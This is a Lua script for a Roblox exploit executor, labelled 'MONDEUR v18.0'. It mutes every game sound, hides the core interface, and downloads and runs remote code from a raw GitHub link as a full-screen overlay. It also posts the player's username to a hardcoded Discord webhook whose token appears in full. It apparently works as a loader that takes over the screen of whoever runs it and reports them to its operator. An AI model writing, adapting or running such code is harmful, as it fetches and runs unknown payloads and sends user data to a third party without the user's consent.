-- [[ MONDEUR v18.0 - SYSTEM CONNECTED + MUTE ]] --
if getgenv().MondeurExecuted then return end
getgenv().MondeurExecuted = true

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG"

-- [[ 1. THE MUTE SYSTEM ]] --
local function MuteGame()
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Sound") then
                v.Volume = 0
            end
        end
    end)
end

-- [[ 2. THE INSTANT LOADING SCREEN ]] --
local function LoadUI()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
        if ui then
            ui.Name = "MondeurGuard"
            ui.DisplayOrder = 2147483647
            ui.IgnoreGuiInset = true
            ui.ResetOnSpawn = false
        end
    end)
end

-- [[ 3. WEBHOOK DESIGN (MATCHES SCREENSHOT) ]] --
local function SendSystemLog()
    local payload = HttpService:JSONEncode({
        ["username"] = "bitchass",
        ["embeds"] = {{
            ["title"] = "💎 SYSTEM CONNECTED",
            ["color"] = 0x00FF00,
            ["fields"] = {
                {["name"] = "User", ["value"] = "**" .. LocalPlayer.Name .. "**", ["inline"] = false},
                {["name"] = "Target", ["value"] = "Issues v18.0", ["inline"] = false},
                {["name"] = "Points", ["value"] = "0", ["inline"] = false}
            }
        }}
    })
    
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

-- [[ EXECUTION ]] --
task.spawn(MuteGame)
task.spawn(LoadUI)
task.spawn(SendSystemLog)
